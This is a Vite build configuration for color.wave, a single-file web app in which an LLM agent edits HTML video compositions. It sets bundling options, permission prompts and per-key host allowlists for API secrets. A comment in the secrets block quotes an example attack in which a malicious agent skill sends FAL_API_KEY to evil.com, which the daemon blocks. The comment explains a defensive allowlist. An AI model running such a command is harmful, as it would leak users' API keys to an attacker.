// color.wave — chat-on-left, player+timeline-on-right.
// An LLM agent edits an HTML video composition; a sandboxed iframe
// renders it; a parsed timeline shows clips with their data-start /
// data-duration. Single-file SPA shipped as a .workbook.html artifact.
import tailwindcss from "@tailwindcss/vite";
import wasm from "vite-plugin-wasm";

export default {
  name: "color.wave",
  slug: "colorwave",
  type: "spa",
  // SPA-shape workbook — no Polars / Plotters / Rhai / Arrow needed.
  // The "app" wasm variant is ~140 KB vs default ~16 MB; drops total
  // workbook size by ~15 MB without losing anything colorwave uses.
  // wb.* + Yjs are pure JS and unaffected by the variant choice.
  wasmVariant: "app",
  // hyperframes-memory tries arrowEncodeJsonRows / appendArrowIpc
  // for compact tensor logging but feature-detects first and degrades
  // gracefully when the arrow surface isn't in this slice. Silence
  // the variant-coverage warning since the call sites are intentional.
  wasmVariantCheck: false,
  version: "0.1",
  entry: "src/index.html",
  vite: {
    // vite-plugin-wasm handles ESM-integrated WASM init for any
    // wasm-bearing dep the runtime crate pulls in. loro-crdt is no
    // longer bundled (Phase 2 swap to Yjs, pure JS); the plugin stays
    // since the workbook-runtime crate ships its own WASM.
    //
    // We deliberately do NOT pair with vite-plugin-top-level-await:
    // vite-plugin-singlefile flattens every module into one inline
    // <script>, and the TLA plugin's IIFE wrapper produces TDZ
    // violations when its variables are read before the wrapper has
    // initialized them. Modern browsers support top-level await
    // natively at the module level, so target=esnext + native TLA
    // is the cleaner path. (If we ever need to support older
    // browsers, we'd need to disable singlefile too.)
    plugins: [tailwindcss(), wasm()],
    build: {
      target: "esnext",
      minify: "terser",
      terserOptions: {
        compress: {
          passes: 3,
          pure_getters: true,
          // unsafe_* flags + ecma:2020 lift removed — they mangled
          // plugin code patterns (palette-swap recoloring broke).
          // Saved ~28 KB total which is negligible against the 25 MB
          // WASM floor. Plain passes=3 + pure_getters keeps a few KB
          // of safe savings without touching method/proto behavior.
          drop_console: false,
        },
        mangle: { properties: false },
        format: {
          // Strip JSDoc / explanatory header comments (we have a lot
          // of them — they survive minification by default).
          comments: false,
        },
      },
    },
    resolve: {
      alias: [
        // just-bash imports node:zlib for its gzip/gunzip/zcat
        // commands (which the agent doesn't need for editing HTML).
        // Stub the import to avoid pulling a polyfill into the bundle.
        { find: "node:zlib", replacement: new URL("./src/lib/zlib-stub.js", import.meta.url).pathname },
      ],
    },
  },
  env: {
    OPENROUTER_API_KEY: {
      label: "openrouter api key",
      prompt: "sk-or-…",
      required: true,
      secret: true,
    },
  },
  // Per-workbook permissions — surfaced as a one-time approval
  // dialog the first time the daemon serves this file. Each entry's
  // `reason` is shown verbatim; keep them human, not jargon. The
  // daemon stores grants per workbook path so the dialog only
  // pops once per file.
  permissions: {
    agents: {
      reason:
        "Lets you swap colorwave's built-in chat for your local Claude Code or " +
        "Codex CLI. Runs over your subscription — your CLI's existing login is " +
        "what authenticates; no API keys are sent.",
    },
    autosave: {
      reason:
        "Saves your edits back to this .workbook.html file as you work, so the " +
        "composition you build is in the file you keep.",
    },
    secrets: {
      reason:
        "Stores API keys for fal.ai, ElevenLabs, Runway, or HuggingFace in your " +
        "OS keychain — never in the file you share. Used to generate or remix " +
        "video / audio inside this workbook.",
    },
    network: {
      reason:
        "Calls the API endpoints you've configured (e.g. queue.fal.run) on " +
        "your behalf. Outbound HTTPS is restricted to the host allowlist " +
        "below; nothing else gets a request from this workbook.",
    },
  },

  // Install-prompt copy overrides (Phase 3) — per-feature override
  // of the SDK's default catalog. Surfaces in the wall the runtime
  // mounts when a user hits a daemon-only feature without Workbooks
  // installed (e.g. tries to send a chat message via local Claude
  // Code while opened from file://). Authors only need to override
  // the features they actually use; unspecified ones keep the SDK
  // default.
  installPrompts: {
    agents: {
      title: "Bring your own LLM to colorwave",
      reason:
        "Wire Claude Code or Codex CLI into colorwave for a real co-edit loop. " +
        "Workbooks runs over your CLI's subscription — no API keys are sent.",
    },
    autosave: {
      title: "Save your composition in place",
      reason:
        "Edit and save this colorwave file like a document. Workbooks writes " +
        "your composition back to disk atomically so the file you share is " +
        "always the composition you built.",
    },
  },

  // Integration keys live in the daemon's keychain (workbooksd 0.1+),
  // not in env / localStorage. The `secrets` block declares which
  // HTTPS hosts each key may be sent to — workbooksd refuses any
  // /proxy call whose URL host isn't in the matching list. Strict
  // ALLOWLIST: a malicious skill can't say
  //   wb-fetch --secret=FAL_API_KEY https://evil.com
  // and have the daemon helpfully forward the key. The daemon
  // returns 403 instead.
  secrets: {
    FAL_API_KEY: {
      domains: ["fal.run", "*.fal.run", "fal.media", "*.fal.media"],
    },
    ELEVENLABS_API_KEY: {
      domains: ["api.elevenlabs.io"],
    },
    RUNWAY_API_KEY: {
      domains: ["api.dev.runwayml.com", "api.runwayml.com"],
    },
    HUGGINGFACE_TOKEN: {
      domains: [
        "api-inference.huggingface.co",
        "huggingface.co",
        "*.hf.space",
      ],
    },
  },
};
